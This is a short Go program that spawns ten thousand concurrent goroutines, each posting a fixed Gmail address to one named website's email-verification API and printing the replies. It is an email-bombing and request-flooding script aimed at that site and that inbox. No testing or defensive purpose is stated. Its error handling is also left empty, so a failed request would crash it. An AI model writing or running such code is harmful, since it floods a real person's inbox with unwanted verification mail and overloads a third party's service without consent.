package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"time"
)

func main() {
	ch2 := make(chan interface{})
	for i := 0; i < 10000; i++ {
		go httpPostForm("1234qwer@gmail.com", ch2)
	}
	i := 0
	for {
		select {
		case u := <-ch2:
			print(u)
			i = 0
		default:
			print("ok")
			if i > 10 {
				goto Loop
			}
			i++
			time.Sleep(time.Second)
		}
	}
Loop:
	print("执行完成")
}

func httpPostForm(email string, chanel chan interface{}) {
	chanel <- email
	resp, err := http.PostForm("https://www.feiguayun.com/api/v1/passport/comm/sendEmailVerify",
		url.Values{"key": {"value"}, "email": {email}})
	if err != nil {
		// handle error
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// handle error
	}

	fmt.Println(string(body))

	chanel <- string(body)

}
